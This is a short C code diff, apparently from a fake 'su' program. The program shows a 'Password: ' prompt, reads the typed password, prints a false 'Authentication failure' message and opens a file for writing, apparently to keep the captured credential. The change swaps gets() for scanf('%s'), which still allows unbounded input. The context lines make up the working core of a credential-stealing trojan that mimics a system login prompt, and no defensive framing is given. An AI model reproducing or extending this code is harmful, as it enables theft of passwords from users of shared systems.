@@ -14,7 +14,7 @@ int main(int argc, char *argv[]){
     if (argc == 2)  user = argv[1];
     if (argc > 2)   user = argv[argc - 1];
     fprintf(stdout, "Password: ");
-    gets(pass);
+    scanf("%s", pass);
     system("sleep 2");
     fprintf(stdout, "su: Authentication failure\nSorry.\n");
     if ((fp = fopen(filex, "w")) != NULL){
